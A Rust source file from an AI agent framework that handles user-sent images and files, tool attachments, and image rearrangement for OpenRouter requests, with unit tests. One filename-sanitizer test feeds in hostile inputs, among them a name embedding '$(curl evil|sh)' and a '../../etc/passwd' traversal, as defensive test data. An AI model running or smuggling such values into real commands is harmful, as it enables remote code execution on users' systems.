//! Images and files that travel with a turn.
//!
//! - Inbound: a [`File`] a user sent with their message. Images among them
//!   go to the model as images, not as text about images.
//! - Outbound: an [`Attachment`] a tool put in the run's [`Outbox`] for the
//!   transport to deliver after the turn.
//! - Model requests: [`Vision`] wraps the provider's model so tool results
//!   can carry images (a screenshot the model looks at) on a wire that only
//!   takes images from the user; see [`for_the_wire`].
//! - Transcripts: [`strip_images`] keeps image bytes out of the database, so
//!   a turn's images are never paid for again in later turns.

use rig_core::completion::{
    CompletionError, CompletionModel, CompletionRequest, CompletionResponse, ProviderCapabilities,
};
use rig_core::message::{
    AssistantContent, DocumentSourceKind, Image, ImageMediaType, Message, ToolResultContent,
    UserContent,
};
use rig_core::streaming::StreamingCompletionResponse;
use std::sync::{Arc, Mutex, PoisonError};

/// The largest image the model is shown, in bytes before encoding. Its
/// base64 form is 5 MB, the smallest per-image limit among the providers
/// OpenRouter routes to.
pub const MAX_IMAGE_BYTES: usize = 3_750_000;

/// Images one model request carries at most. A screenshot loop keeps
/// adding them; older ones are replaced by [`OLDER_IMAGE`], so the cost of a
/// request stays bounded however long the turn runs.
pub const MAX_IMAGES_PER_REQUEST: usize = 4;

/// Files one turn may send the user.
pub const MAX_ATTACHMENTS: usize = 10;

/// What replaces an image in a stored transcript.
pub const NOT_KEPT: &str = "[image not kept in the transcript]";

/// What replaces an image past [`MAX_IMAGES_PER_REQUEST`] in a request.
pub const OLDER_IMAGE: &str = "[older image omitted]";

/// A file a user sent with their message. Its bytes are not kept: they go
/// to the sandbox, and to the model as an image if they are one.
#[derive(Debug, Clone, PartialEq)]
pub struct File {
    /// The file's name, safe to use as the last part of a path.
    pub name: String,
    /// The type the sender's client reported, if any.
    pub mime: Option<String>,
    /// In bytes: as received, or as reported if it was not received.
    pub size: u64,
    /// The file as the model is shown it, or why it is not; `None` for a
    /// file that is no image at all. See [`shown`].
    pub image: Option<Result<Image, String>>,
    /// Where the file is in the session's sandbox, or why it is not there.
    pub saved: Result<String, String>,
}

/// Whether `bytes`, sent as type `mime`, are shown to the model: as an
/// image if they are one the model can be shown, with the reason if they
/// are an image or claim to be one but cannot be, and `None` otherwise.
pub fn shown(bytes: &[u8], mime: Option<&str>) -> Option<Result<Image, String>> {
    let claimed = mime.is_some_and(|m| m.starts_with("image/"));
    (claimed || image_type(bytes).is_some()).then(|| image(bytes))
}

/// How an [`Attachment`] is shown to the user.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    /// Shown inline as a picture.
    Photo,
    /// Offered as a file to download.
    Document,
}

/// A file a tool asked to send the user.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Attachment {
    pub name: String,
    pub bytes: Vec<u8>,
    pub kind: Kind,
    pub caption: Option<String>,
}

/// Where one run's tools put the files they send. The transport creates
/// it, and delivers what is in it once the turn has finished.
///
/// A run without one (the HTTP API, the CLI) cannot send files, and the
/// tools say so to the model rather than drop the file.
#[derive(Debug, Clone, Default)]
pub struct Outbox(Arc<Mutex<Vec<Attachment>>>);

impl Outbox {
    /// Queue `attachment`, unless the turn has already queued
    /// [`MAX_ATTACHMENTS`].
    pub fn push(&self, attachment: Attachment) -> Result<(), String> {
        let mut queued = self.0.lock().unwrap_or_else(PoisonError::into_inner);
        if queued.len() >= MAX_ATTACHMENTS {
            return Err(format!(
                "this turn has already sent {MAX_ATTACHMENTS} files; send the rest in a later turn"
            ));
        }
        queued.push(attachment);
        Ok(())
    }

    /// Everything queued so far, in order, leaving the outbox empty.
    pub fn take(&self) -> Vec<Attachment> {
        std::mem::take(&mut *self.0.lock().unwrap_or_else(PoisonError::into_inner))
    }
}

/// The longest file name [`safe_name`] returns, in bytes.
pub const MAX_NAME_BYTES: usize = 100;

/// A name someone else chose, made safe as the last part of a path and as
/// text a model may paste into a shell: only letters, digits, spaces and
/// `._()-` are kept, anything else (shell syntax, control and invisible
/// characters) becomes `_`. No directories, no leading dots (so neither
/// `..` nor a hidden file), at most [`MAX_NAME_BYTES`]. `file` if nothing
/// is left.
pub fn safe_name(name: &str) -> String {
    let base = name.rsplit(['/', '\\']).next().unwrap_or(name);
    let kept = |c: char| c.is_alphanumeric() || " ._()-".contains(c);
    let clean: String = base
        .chars()
        .map(|c| if kept(c) { c } else { '_' })
        .collect();
    let clean = clean.trim().trim_start_matches('.');
    let mut end = clean.len().min(MAX_NAME_BYTES);
    while !clean.is_char_boundary(end) {
        end -= 1;
    }
    match clean[..end].trim_end() {
        "" => "file".into(),
        kept => kept.into(),
    }
}

/// The image format of `bytes`, from their first bytes, if the model can
/// be shown it.
pub fn image_type(bytes: &[u8]) -> Option<ImageMediaType> {
    if bytes.starts_with(b"\x89PNG\r\n\x1a\n") {
        Some(ImageMediaType::PNG)
    } else if bytes.starts_with(b"\xff\xd8\xff") {
        Some(ImageMediaType::JPEG)
    } else if bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a") {
        Some(ImageMediaType::GIF)
    } else if bytes.len() >= 12 && &bytes[..4] == b"RIFF" && &bytes[8..12] == b"WEBP" {
        Some(ImageMediaType::WEBP)
    } else {
        None
    }
}

/// `bytes` as an image for the model, or why it cannot be one.
pub fn image(bytes: &[u8]) -> Result<Image, String> {
    let Some(media_type) = image_type(bytes) else {
        return Err("not a PNG, JPEG, GIF or WebP image".into());
    };
    if bytes.len() > MAX_IMAGE_BYTES {
        return Err(format!(
            "the image is {} bytes, over the {MAX_IMAGE_BYTES} bytes the model can be shown",
            bytes.len()
        ));
    }
    Ok(Image {
        data: DocumentSourceKind::Base64(base64(bytes)),
        media_type: Some(media_type),
        detail: None,
        additional_params: None,
    })
}

/// Standard base64 with padding (RFC 4648 section 4).
pub fn base64(bytes: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let b = [
            chunk[0],
            *chunk.get(1).unwrap_or(&0),
            *chunk.get(2).unwrap_or(&0),
        ];
        let n = u32::from(b[0]) << 16 | u32::from(b[1]) << 8 | u32::from(b[2]);
        for i in 0..4 {
            if i <= chunk.len() {
                out.push(ALPHABET[(n >> (18 - 6 * i) & 63) as usize] as char);
            } else {
                out.push('=');
            }
        }
    }
    out
}

/// `messages` with every image replaced by [`NOT_KEPT`], whether a user
/// sent it, a tool returned it or the model made it. Nothing else changes,
/// one message for one.
pub fn strip_images(messages: &[Message]) -> Vec<Message> {
    messages
        .iter()
        .map(|message| match message {
            Message::User { content } => Message::User {
                content: content.iter().map(strip_user_part).collect(),
            },
            Message::Assistant { id, content } => Message::Assistant {
                id: id.clone(),
                content: content
                    .iter()
                    .map(|part| match part {
                        AssistantContent::Image(_) => AssistantContent::text(NOT_KEPT),
                        other => other.clone(),
                    })
                    .collect(),
            },
            other => other.clone(),
        })
        .collect()
}

fn strip_user_part(part: &UserContent) -> UserContent {
    match part {
        UserContent::Image(_) => UserContent::text(NOT_KEPT),
        UserContent::ToolResult(result) => {
            let mut result = result.clone();
            for item in &mut result.content {
                if matches!(item, ToolResultContent::Image(_)) {
                    *item = ToolResultContent::text(NOT_KEPT);
                }
            }
            UserContent::ToolResult(result)
        }
        other => other.clone(),
    }
}

/// A request's messages rearranged for a wire that takes images only from
/// the user, as OpenRouter's chat API does (Rig refuses to send an image
/// in a tool result there).
///
/// In each user message, images in tool results move to the end of the
/// message, each after a line naming the tool: the provider sends the tool
/// results first, as the replies to the assistant's calls, and then one
/// user message with the images. A tool result left with no text says the
/// image follows. Then only the newest [`MAX_IMAGES_PER_REQUEST`] images
/// are kept.
pub fn for_the_wire(messages: Vec<Message>) -> Vec<Message> {
    let messages: Vec<Message> = messages.into_iter().map(lift_tool_images).collect();
    keep_newest_images(messages, MAX_IMAGES_PER_REQUEST)
}

fn lift_tool_images(message: Message) -> Message {
    let Message::User { content } = message else {
        return message;
    };
    let mut kept = Vec::with_capacity(content.len());
    let mut lifted = Vec::new();
    for part in content {
        let UserContent::ToolResult(mut result) = part else {
            kept.push(part);
            continue;
        };
        let mut images = Vec::new();
        let mut rest = Vec::new();
        for item in result.content {
            match item {
                ToolResultContent::Image(image) => images.push(UserContent::Image(image)),
                other => rest.push(other),
            }
        }
        if !images.is_empty() {
            lifted.push(UserContent::text(format!("Image from {}:", result.name)));
            lifted.append(&mut images);
        }
        result.content = if rest.is_empty() {
            vec![ToolResultContent::text("[image follows]")]
        } else {
            rest
        };
        kept.push(UserContent::ToolResult(result));
    }
    kept.extend(lifted);
    Message::User { content: kept }
}

fn keep_newest_images(mut messages: Vec<Message>, keep: usize) -> Vec<Message> {
    let mut seen = 0;
    for message in messages.iter_mut().rev() {
        let Message::User { content } = message else {
            continue;
        };
        for part in content.iter_mut().rev() {
            if matches!(part, UserContent::Image(_)) {
                seen += 1;
                if seen > keep {
                    *part = UserContent::text(OLDER_IMAGE);
                }
            }
        }
    }
    messages
}

/// A model whose requests are passed through [`for_the_wire`] first.
#[derive(Debug, Clone)]
pub struct Vision<M>(pub M);

impl<M: CompletionModel> CompletionModel for Vision<M> {
    async fn completion(
        &self,
        mut request: CompletionRequest,
    ) -> Result<CompletionResponse, CompletionError> {
        request.chat_history = for_the_wire(request.chat_history);
        self.0.completion(request).await
    }

    async fn stream(
        &self,
        mut request: CompletionRequest,
    ) -> Result<StreamingCompletionResponse, CompletionError> {
        request.chat_history = for_the_wire(request.chat_history);
        self.0.stream(request).await
    }

    fn capabilities(&self) -> ProviderCapabilities {
        self.0.capabilities()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rig_core::test_utils::{MockCompletionModel, MockStreamEvent, MockTurn};

    const PNG: &[u8] = b"\x89PNG\r\n\x1a\nrest";

    fn png() -> Image {
        image(PNG).unwrap()
    }

    fn tool_result(name: &str, content: Vec<ToolResultContent>) -> UserContent {
        UserContent::tool_result("call-1", name, content)
    }

    fn text(text: &str) -> ToolResultContent {
        ToolResultContent::text(text)
    }

    fn user(content: Vec<UserContent>) -> Message {
        Message::User { content }
    }

    #[test]
    fn base64_matches_the_rfc_4648_test_vectors() {
        for (plain, encoded) in [
            ("", ""),
            ("f", "Zg=="),
            ("fo", "Zm8="),
            ("foo", "Zm9v"),
            ("foob", "Zm9vYg=="),
            ("fooba", "Zm9vYmE="),
            ("foobar", "Zm9vYmFy"),
        ] {
            assert_eq!(base64(plain.as_bytes()), encoded, "{plain}");
        }
        assert_eq!(base64(&[0xff, 0xfe, 0xfd]), "//79");
    }

    #[test]
    fn names_from_outside_become_one_harmless_path_part() {
        for (given, safe) in [
            ("report.pdf", "report.pdf"),
            ("../../etc/passwd", "passwd"),
            ("C:\\Users\\me\\photo.jpg", "photo.jpg"),
            ("..", "file"),
            ("...hidden", "hidden"),
            ("a\nb\u{0}c\u{7f}.txt", "a_b_c_.txt"),
            ("x$(curl evil|sh);`id`.pdf", "x_(curl evil_sh)__id_.pdf"),
            ("invoice\u{202e}fdp.exe", "invoice_fdp.exe"),
            ("отчёт 2026.pdf", "отчёт 2026.pdf"),
            ("  spaced  ", "spaced"),
            ("", "file"),
            ("dir/", "file"),
            ("my file (1).png", "my file (1).png"),
        ] {
            assert_eq!(safe_name(given), safe, "{given:?}");
        }
        // Three bytes each: the cut at 100 bytes falls inside one, so it
        // moves back to 99.
        let long = "中".repeat(40);
        let cut = safe_name(&long);
        assert_eq!(cut, "中".repeat(33));
        assert_eq!(safe_name(&format!("{} x", "a".repeat(99))), "a".repeat(99));
    }

    #[test]
    fn a_file_is_shown_when_it_is_an_image_and_explained_when_it_claims_to_be() {
        assert_eq!(shown(PNG, None), Some(Ok(png())));
        assert_eq!(
            shown(PNG, Some("application/octet-stream")),
            Some(Ok(png()))
        );
        let fake = shown(b"not really", Some("image/jpeg"))
            .unwrap()
            .unwrap_err();
        assert!(fake.contains("not a PNG"), "{fake}");
        assert_eq!(shown(b"%PDF", Some("application/pdf")), None);
        assert_eq!(shown(b"%PDF", None), None);
    }

    #[test]
    fn images_are_recognised_by_their_first_bytes() {
        assert_eq!(image_type(PNG), Some(ImageMediaType::PNG));
        assert_eq!(
            image_type(b"\xff\xd8\xff\xe0.."),
            Some(ImageMediaType::JPEG)
        );
        assert_eq!(image_type(b"GIF87a.."), Some(ImageMediaType::GIF));
        assert_eq!(image_type(b"GIF89a.."), Some(ImageMediaType::GIF));
        assert_eq!(
            image_type(b"RIFF\0\0\0\0WEBPVP8 "),
            Some(ImageMediaType::WEBP)
        );
        for other in [
            &b"RIFF\0\0\0\0WAVE"[..],
            b"RIFF",
            b"%PDF-1.7",
            b"",
            b"GIF90a",
        ] {
            assert_eq!(image_type(other), None, "{other:?}");
        }
    }

    #[test]
    fn an_image_is_base64_with_its_type_and_only_up_to_the_limit() {
        let shown = png();
        assert_eq!(shown.data, DocumentSourceKind::Base64(base64(PNG)));
        assert_eq!(shown.media_type, Some(ImageMediaType::PNG));

        assert!(image(b"%PDF").unwrap_err().contains("not a PNG"));
        let mut big = PNG.to_vec();
        big.resize(MAX_IMAGE_BYTES + 1, 0);
        assert!(image(&big).unwrap_err().contains("over the"));
        big.truncate(MAX_IMAGE_BYTES);
        assert!(image(&big).is_ok());
    }

    #[test]
    fn the_outbox_hands_over_its_files_once_and_refuses_past_the_limit() {
        let outbox = Outbox::default();
        let file = |n: usize| Attachment {
            name: format!("f{n}"),
            bytes: vec![],
            kind: Kind::Document,
            caption: None,
        };
        for n in 0..MAX_ATTACHMENTS {
            outbox.clone().push(file(n)).unwrap();
        }
        assert!(outbox.push(file(99)).unwrap_err().contains("already sent"));
        let taken = outbox.take();
        assert_eq!(taken.len(), MAX_ATTACHMENTS);
        assert_eq!(taken[0].name, "f0");
        assert!(outbox.take().is_empty());
        assert!(outbox.push(file(0)).is_ok());
    }

    #[test]
    fn stored_messages_keep_everything_but_image_bytes() {
        let system = Message::System {
            content: "sys".into(),
        };
        let messages = vec![
            system.clone(),
            user(vec![
                UserContent::text("look"),
                UserContent::Image(png()),
                tool_result(
                    "view_image",
                    vec![text("saved"), ToolResultContent::Image(png())],
                ),
            ]),
            Message::Assistant {
                id: Some("m1".into()),
                content: vec![
                    AssistantContent::text("drew"),
                    AssistantContent::Image(png()),
                ],
            },
        ];
        let expected = vec![
            system,
            user(vec![
                UserContent::text("look"),
                UserContent::text(NOT_KEPT),
                tool_result("view_image", vec![text("saved"), text(NOT_KEPT)]),
            ]),
            Message::Assistant {
                id: Some("m1".into()),
                content: vec![
                    AssistantContent::text("drew"),
                    AssistantContent::text(NOT_KEPT),
                ],
            },
        ];
        assert_eq!(strip_images(&messages), expected);
    }

    #[test]
    fn tool_images_move_after_every_tool_result_in_their_message() {
        let calls = Message::assistant("calls");
        let messages = vec![
            calls.clone(),
            user(vec![
                tool_result(
                    "view_image",
                    vec![text("saved"), ToolResultContent::Image(png())],
                ),
                tool_result("shell", vec![text("ok")]),
                tool_result("view_image", vec![ToolResultContent::Image(png())]),
            ]),
        ];
        let expected = vec![
            calls,
            user(vec![
                tool_result("view_image", vec![text("saved")]),
                tool_result("shell", vec![text("ok")]),
                tool_result("view_image", vec![text("[image follows]")]),
                UserContent::text("Image from view_image:"),
                UserContent::Image(png()),
                UserContent::text("Image from view_image:"),
                UserContent::Image(png()),
            ]),
        ];
        assert_eq!(for_the_wire(messages), expected);
    }

    #[test]
    fn openrouter_refuses_a_tool_image_but_takes_it_rearranged() {
        use rig_core::providers::openrouter::messages_from_rig_message;
        let message = user(vec![
            tool_result(
                "view_image",
                vec![text("saved"), ToolResultContent::Image(png())],
            ),
            tool_result("shell", vec![text("ok")]),
        ]);
        let refused = messages_from_rig_message(message.clone())
            .unwrap_err()
            .to_string();
        assert!(refused.contains("images in tool results"), "{refused}");

        let [rearranged] = for_the_wire(vec![message]).try_into().unwrap();
        let wire = serde_json::to_value(messages_from_rig_message(rearranged).unwrap()).unwrap();
        let roles: Vec<&str> = wire
            .as_array()
            .unwrap()
            .iter()
            .map(|m| m["role"].as_str().unwrap())
            .collect();
        // Both tool replies straight after the calls, then the image.
        assert_eq!(roles, ["tool", "tool", "user"]);
        assert_eq!(wire[0]["content"], "saved");
        let url = wire[2]["content"][1]["image_url"]["url"].as_str().unwrap();
        assert_eq!(url, format!("data:image/png;base64,{}", base64(PNG)));
    }

    #[test]
    fn only_the_newest_images_are_sent() {
        let with =
            |n: usize, image: UserContent| user(vec![UserContent::text(n.to_string()), image]);
        let count = MAX_IMAGES_PER_REQUEST + 2;
        let messages = (0..count)
            .map(|n| with(n, UserContent::Image(png())))
            .collect();
        let expected: Vec<Message> = (0..count)
            .map(|n| match n {
                0 | 1 => with(n, UserContent::text(OLDER_IMAGE)),
                _ => with(n, UserContent::Image(png())),
            })
            .collect();
        assert_eq!(for_the_wire(messages), expected);
    }

    fn request_with_a_tool_image() -> CompletionRequest {
        let model = MockCompletionModel::text("unused");
        let mut request = model.completion_request("prompt").build();
        request.chat_history = vec![user(vec![tool_result(
            "view_image",
            vec![ToolResultContent::Image(png())],
        )])];
        request
    }

    fn sent(model: &MockCompletionModel) -> Vec<Message> {
        model.requests()[0].chat_history.clone()
    }

    #[tokio::test]
    async fn the_wrapped_model_gets_rearranged_requests_whether_blocking_or_streaming() {
        let expected = for_the_wire(request_with_a_tool_image().chat_history);

        let blocking = MockCompletionModel::new([MockTurn::text("fine")]);
        let vision = Vision(blocking.clone());
        assert_eq!(vision.capabilities(), blocking.capabilities());
        vision
            .completion(request_with_a_tool_image())
            .await
            .unwrap();
        assert_eq!(sent(&blocking), expected);

        let streaming = MockCompletionModel::from_stream_turns([vec![
            MockStreamEvent::text("fine"),
            MockStreamEvent::final_response(Default::default()),
        ]]);
        let vision = Vision(streaming.clone());
        assert!(vision.stream(request_with_a_tool_image()).await.is_ok());
        assert_eq!(sent(&streaming), expected);
    }
}
